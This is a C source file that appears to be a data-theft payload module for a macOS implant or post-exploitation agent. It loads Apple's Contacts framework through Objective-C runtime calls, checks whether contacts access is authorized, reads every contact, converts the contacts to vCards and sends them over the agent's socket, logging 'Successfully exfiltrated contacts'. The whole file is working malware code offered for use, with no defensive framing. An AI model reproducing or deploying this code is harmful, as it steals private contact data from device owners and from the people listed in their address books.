#include <payload.h>

int CNEntityTypeContacts            = 0;
int CNAuthorizationStatusAuthorized = 3;

bool is_authorized(agent_p agent);
void *get_all_contacts(agent_p agent);
bool serialize_contacts(agent_p agent, void *contacts, uint8_t **buffer, uint64_t *size);

void start(void *entry, agent_p agent)
{
    bool ret = false;
    uint64_t size = 0;
    uint64_t sent = 0;
    uint8_t *buffer = NULL;
    void *contacts = NULL;


    log_info("Loading Contacts.framework");
    if (!objcLoadBundle("/System/Library/Frameworks/Contacts.framework")) {
        log_error("Failed to load Contacts.framework");
        goto fail;
    }

    log_info("Checking contacts authorization status");
    if (is_authorized(agent) == false) {
        log_info("Not authorized to access contacts, bailing..");
        goto fail;
    }

    log_info("Fetching contacts");
    if ((contacts = get_all_contacts(agent)) == NULL)
        goto fail;

    log_info("Converting contacts to vCards");
    ret = serialize_contacts(agent, contacts, &buffer, &size);
    objcRelease(contacts);

    if (ret == false)
        goto fail;

    log_info("Sending buffer with size: %llu", size);
    agent->trampoline.send(agent->fd, &size, sizeof(size), 0);

    while (sent < size) {
        ssize_t c = agent->trampoline.send(agent->fd, buffer + sent, size - sent, 0);

        if (c < 0) {
            log_error("Failed to send buffer: %s", agent->trampoline.strerror(*(agent->trampoline.errno)));
            return;
        }

        sent += c;
    }

    log_info("Successfully exfiltrated contacts");
    return;
fail:
    size = 0;
    agent->trampoline.send(agent->fd, &size, sizeof(size), 0);
}

bool is_authorized(agent_p agent)
{
    return (
        (int)objcMsgSendCast(int)(
            objcGetClass(CNContactStore),
            objcGetSelector(authorizationStatusForEntityType:),
            CNEntityTypeContacts
        ) == CNAuthorizationStatusAuthorized
    );
}

void *get_all_contacts(agent_p agent)
{
    void    *contactStore   = NULL,
            *predicate      = NULL,
            *keys           = NULL,
            *contacts       = NULL;

    if ((contactStore = objcAllocInitClass(CNContactStore)) == NULL) {
        log_info("Failed to init CNContactStore, bailing..");
        return NULL;
    }

    predicate = objcMsgSendCast(void *)(
        objcGetClass(CNContact),
        objcGetSelector(predicateForContactsInContainerWithIdentifier:),
        objcMsgSendCast()(
            contactStore,
            objcGetSelector(defaultContainerIdentifier)
        )
    );

    if (predicate == NULL) {
        log_info("Failed to create predicate, bailing..");
        return NULL;
    }

    keys = objcMsgSendCast(void *)(
        objcGetClass(NSArray),
        objcGetSelector(arrayWithObjects:),
        objcMsgSendCast()(
            objcGetClass(CNContactVCardSerialization),
            objcGetSelector(descriptorForRequiredKeys)
        )
    );

    if (keys == NULL) {
        log_info("Failed to fetch required vCard keys, bailing..");
        return NULL;
    }

    objcRetain(predicate);
    objcRetain(keys);

    contacts = objcMsgSendCast(void *, void *, void *)(
        contactStore,
        objcGetSelector(unifiedContactsMatchingPredicate:keysToFetch:error:),
        predicate,
        keys,
        NULL
    );

    if (contacts == NULL)
        log_info("Failed to fetch contacts, bailing..");
    else
        objcRetain(contacts);

    return contacts;
}

bool serialize_contacts(agent_p agent, void *contacts, uint8_t **buffer, uint64_t *size)
{
    void *vcards = NULL;

    vcards = objcMsgSendCast(void *, void *)(
        objcGetClass(CNContactVCardSerialization),
        objcGetSelector(dataWithContacts:error:),
        contacts,
        NULL
    );

    if (vcards == NULL) {
        log_info("Failed to convert contacts to vCards");
        return false;
    }

    *buffer = (uint8_t *)objcMsgSendCast()(vcards, objcGetSelector(bytes));

    if (*buffer == NULL) {
        log_info("Failed to extract vCards data");
        return false;
    }

    *size = (uint64_t)objcMsgSendCast()(vcards, objcGetSelector(length));
    return true;
}